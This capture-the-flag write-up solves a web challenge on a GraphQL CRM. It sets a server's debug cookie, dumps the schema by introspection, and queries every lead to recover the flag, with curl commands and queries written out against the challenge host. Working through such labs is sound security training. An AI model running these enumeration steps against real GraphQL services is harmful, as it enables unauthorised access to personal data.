# Graphene
* Category: Web
* 250 Points
* Solved by the JCTF Team

## Description
> Graphene is an easy to use CRM to manage leads. 
> 
> Some leads are VIP. Those are the most special ones.

## Solution

We visit the attached website and get a simple login page. If we check the sources, we see the following Javascript logic:

```javascript
      $(document).ready(function(){
        $("#signIn").on("click", function(){
          var username = $('#username').val();
          var password = $('#password').val();
          var query = `mutation login {login(username:"${username}", password: "${password}") {user {username}ok}}`;
          // var query = {"username": username, "password": password};
          $.ajax({
              url: '/api',
              type: 'POST',
              data: JSON.stringify({"query": query}),
              contentType: 'application/json; charset=utf-8',
              dataType: 'json',
              async: false,
              success: function(data) {
                  if(data['login'] == "failed"){
                    $("#wrong").toggle();
                  }
              }
          });          
        });
      });
```

The `query` variable looks like it holds a [GraphQL](https://en.wikipedia.org/wiki/GraphQL) statement:

```graphql
mutation login {login(username:"${username}", password: "${password}") {user {username}ok}}
```

This looks like a simple `login` function (or `mutation`).

Let's try to submit some random credentials:

```console
root@kali:/media/sf_CTFs/appsec/Graphene# curl 'https://graphene.appsecil.ctf.today/api' -H 'Content-Type: application/json; charset=utf-8' --data-raw '{"query":"mutation login {login(username:\"user\", password: \"123456\") {user {username}ok}}"}'
{"login":"failed"}
```

No surprise there. But - if we can submit GraphQL queries, we can try and leak information about the database.

Let's try to leak the schema:

```console
root@kali:/media/sf_CTFs/appsec/Graphene# curl 'https://graphene.appsecil.ctf.today/api' -H 'Content-Type: application/json; charset=utf-8' --data-raw '{"query":"{__schema {types { name } } }"}'
{"login":"failed"}
```

No luck there. We'll get the same response if we try anything else. Time to go back to the drawing board. Let's take a closer look at what the server sends us back when we access the site:

```console
root@kali:/media/sf_CTFs/appsec/Graphene# curl -I 'https://graphene.appsecil.ctf.today/'
HTTP/1.1 200 OK
server: gunicorn/20.0.4
date: Mon, 26 Oct 2020 19:55:29 GMT
content-length: 2472
content-type: text/html; charset=utf-8
last-modified: Sat, 17 Oct 2020 10:20:28 GMT
cache-control: public, max-age=43200
expires: Tue, 27 Oct 2020 07:55:29 GMT
etag: "1602930028.0-2472-1402931165"
set-cookie: debug=0; Path=/
```

The server is setting a `debug` cookie! Let's try changing the value to `1`.

```console
root@kali:/media/sf_CTFs/appsec/Graphene# curl --location --request POST 'https://graphene.appsecil.ctf.today/api' \
> --header 'Cookie: debug=1' \
> --header 'Content-Type: application/json' \
> --data-raw '{"query":"{\n  __schema {\n    types {\n      name\n    }\n  }\n}","variables":{}}' -s |  sed 's/&#34;/"/g' && echo
<!DOCTYPE html>
<html>
<head>
    <title>Debug</title>
</head>
<body>
    <p>Query: {
  __schema {
    types {
      name
    }
  }
}</p>
    <p>Response: {"__schema": {"types": [{"name": "Query"}, {"name": "User"}, {"name": "String"}, {"name": "Lead"}, {"name": "ID"}, {"name": "Boolean"}, {"name": "Int"}, {"name": "Mutations"}, {"name": "Login"}, {"name": "__Schema"}, {"name": "__Type"}, {"name": "__TypeKind"}, {"name": "__Field"}, {"name": "__InputValue"}, {"name": "__EnumValue"}, {"name": "__Directive"}, {"name": "__DirectiveLocation"}]}}</p>
</body>
</html>
```

This looks much better! We can leak schema information using the debug flag. We see that we have some special types such as `User` and `Lead`. Let's check them:

```graphql
# Request: 
{
  __type(name: "User") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}

# Response:
{"__type": {"name": "User", "fields": [{"name":
		"username", "type": {"name": "String", "kind": "SCALAR"}}]}}

# ---

# Request:
{
  __type(name: "Lead") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}

# Response:
{"__type": {"name": "Lead", "fields": [{"name": "id",
		"type": {"name": "ID", "kind": "SCALAR"}}, {"name":
		"firstName", "type": {"name": "String", "kind": "SCALAR"}},
		{"name": "lastName", "type": {"name": "String", "kind":
		"SCALAR"}}, {"name": "email", "type": {"name": "String",
		"kind": "SCALAR"}}, {"name": "gender", "type": {"name":
		"String", "kind": "SCALAR"}}, {"name": "ipAddress", "type":
		{"name": "String", "kind": "SCALAR"}}, {"name": "isVip",
		"type": {"name": "Boolean", "kind": "SCALAR"}}]}}
```

We got their internal structure. Now, let's look for queries:

```graphql
# Request: 
{
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}

# Response:
{"__schema": {"queryType": {"fields": [{"name": "user",
		"description": null}, {"name": "leads", "description": null}]}}}
```

Looks like we have two queries, `user` and `leads`. Let's try querying the leads:

```console
root@kali:/media/sf_CTFs/appsec/Graphene# curl --location --request POST 'https://graphene.appsecil.ctf.today/api' \
> --header 'Cookie: debug=1' \
> --header 'Content-Type: application/json' \
> --data-raw '{"query":"{\n  leads {\n    id\n    firstName\n    lastName\n    email\n    gender\n    ipAddress\n    isVip\n  }\n}","variables":{}}' -s |  sed 's/&#34;/"/g' && echo
<!DOCTYPE html>
<html>
<head>
    <title>Debug</title>
</head>
<body>
    <p>Query: {
  leads {
    id
    firstName
    lastName
    email
    gender
    ipAddress
    isVip
  }
}</p>
    <p>Response: {"leads": null}</p>
</body>
</html>
```

Response is null. Is there anything wrong with our query?

Using a larger query from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection) ("Enumerate Database Schema via Introspection"), we can dump many more details from the schema. Here's what that query shows about the `leads`:

```graphql
{
    "name":"leads",
    "description":null,
    "args":[
        {
        "name":"limit",
        "description":null,
        "type":{
            "kind":"SCALAR",
            "name":"Int",
            "ofType":null
        },
        "defaultValue":null
        }
    ],
    "type":{
        "kind":"LIST",
        "name":null,
        "ofType":{
        "kind":"OBJECT",
        "name":"Lead",
        "ofType":null
        }
    },
    "isDeprecated":false,
    "deprecationReason":null
}
```

So we were missing the `limit` parameter. Let's try adding it:

```graphql
# Request:
{
    leads(limit:1000) {
        id
        firstName
        lastName
        email
        gender
        ipAddress
        isVip
    }
}
```

We get 100 leads of the form:
```graphql
      {
         "id":"1",
         "firstName":"Zacharie",
         "lastName":"Austins",
         "email":"zaustins0@baidu.com",
         "gender":"Male",
         "ipAddress":"211.21.0.141",
         "isVip":false
      },
```

The challenge description mentioned VIPs, let's check if who is a VIP:

```console
root@kali:/media/sf_CTFs/appsec/Graphene# cat leads.txt | grep '"isVip":true' -A 1 -B 7
      {
         "id":"62",
         "firstName":"Claiborne",
         "lastName":"Wrathall",
         "email":"AppSec-IL{c4R8ON-15-9r4phene}",
         "gender":"Male",
         "ipAddress":"135.39.36.56",
         "isVip":true
      },
```

We got the flag.